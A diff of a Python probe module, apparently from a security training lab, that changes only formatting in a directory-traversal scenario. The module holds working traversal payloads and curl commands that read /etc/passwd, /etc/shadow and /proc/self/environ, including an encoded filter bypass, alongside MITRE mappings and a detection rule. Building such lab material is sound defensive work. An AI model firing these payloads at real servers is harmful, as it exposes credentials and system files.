@@ -1,5 +1,5 @@
 """
-modules/dir_traversal.py - APP-03: Directory Traversal probe.
+modules/dir_traversal.py — APP-03: Directory Traversal probe.
 
 Target: GET /files/read?path=<payload>
 Vulnerability: path concatenated to BASE_DIR without normalization.
@@ -15,11 +15,11 @@ from core.models import (
 )
 
 _PAYLOADS = [
-    ("relative-basic", "../../etc/passwd"),
-    ("relative-deep", "../../../etc/shadow"),
-    ("url-encoded", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
-    ("absolute-path", "/etc/hostname"),
-    ("proc-self", "../../proc/self/environ"),
+    ("relative-basic",  "../../etc/passwd"),
+    ("relative-deep",   "../../../etc/shadow"),
+    ("url-encoded",     "%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
+    ("absolute-path",   "/etc/hostname"),
+    ("proc-self",       "../../proc/self/environ"),
 ]
 
 _INDICATORS = ["root:", "nobody:", "www-data:", "/bin/bash", "/bin/sh", "PATH="]
@@ -35,7 +35,7 @@ class DirTraversalModule(BaseModule):
     category = Category.FILE
     scenario_id = "APP-03"
     severity = Severity.HIGH
-    # MITRE ATT&CK - exploit the viewer to discover and read files outside the web root.
+    # MITRE ATT&CK — exploit the viewer to discover and read files outside the web root.
     mitre = {
         "tactics": ["TA0001 Initial Access", "TA0007 Discovery", "TA0006 Credential Access"],
         "techniques": [
@@ -57,15 +57,15 @@ class DirTraversalModule(BaseModule):
             {"action": "Baseline the viewer by reading the intended file.",
              "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
              "command": "curl -s 'http://target-agent/files/read?path=readme.txt'",
-             "expected": "You see the lab readme - confirming the parameter selects a file."},
+             "expected": "You see the lab readme — confirming the parameter selects a file."},
             {"action": "Traverse out of the web root to read /etc/passwd.",
              "technique": "T1083 File and Directory Discovery",
              "command": "curl -s -G http://target-agent/files/read --data-urlencode 'path=../../etc/passwd'",
-             "expected": "/etc/passwd is displayed - entries like 'root:x:0:0:' are visible."},
+             "expected": "/etc/passwd is displayed — entries like 'root:x:0:0:' are visible."},
             {"action": "Bypass naive filters with URL-encoded traversal.",
              "technique": "T1083 File and Directory Discovery",
              "command": "curl -s 'http://target-agent/files/read?path=%2e%2e%2f%2e%2e%2fetc%2fpasswd'",
-             "expected": "The same file contents appear - encoded ../ defeats simple blocklists."},
+             "expected": "The same file contents appear — encoded ../ defeats simple blocklists."},
             {"action": "Harvest secrets / environment from other files.",
              "technique": "T1552.001 Unsecured Credentials: Credentials In Files",
              "command": "curl -s -G http://target-agent/files/read --data-urlencode 'path=../../proc/self/environ'",
@@ -78,7 +78,7 @@ class DirTraversalModule(BaseModule):
         "detection_rule": "Wazuh path-traversal signature (../ in path parameter)",
         "success_markers": [
             "'root:x:0:0:' or 'www-data:' strings in the response",
-            "PASS DISCLOSED in the activity log",
+            "✓ DISCLOSED in the activity log",
             "Wazuh alert on /files/read with traversal payload",
         ],
         "quick_probe": "/files/read?path=../../etc/passwd",
@@ -125,7 +125,7 @@ class DirTraversalModule(BaseModule):
         if custom:
             payloads.append(("custom", custom))
 
-        # -- Recon (T1595.002): baseline read of the intended file --
+        # ── Recon (T1595.002): baseline read of the intended file ──
         self._log(log_fn, "Recon: baseline read of readme.txt (intended use)...")
         base = self._get(target.base_url + endpoint, params={"path": "readme.txt"},
                          label="recon-baseline", timeout=target.timeout)
@@ -144,10 +144,10 @@ class DirTraversalModule(BaseModule):
                 disclosed += 1
                 snippet = body[:120].replace("\n", "↵")
                 r.evidence = f"FILE DISCLOSED: {snippet}"
-                self._log(log_fn, f" PASS DISCLOSED [{label}] | {payload}")
-                self._log(log_fn, f" snippet: {snippet}")
+                self._log(log_fn, f"  ✓ DISCLOSED [{label}]  |  {payload}")
+                self._log(log_fn, f"    snippet: {snippet}")
             else:
-                self._log(log_fn, f" - no sensitive data [{label}] | {payload}")
+                self._log(log_fn, f"  – no sensitive data [{label}]  |  {payload}")
 
             steps.append(r)
 
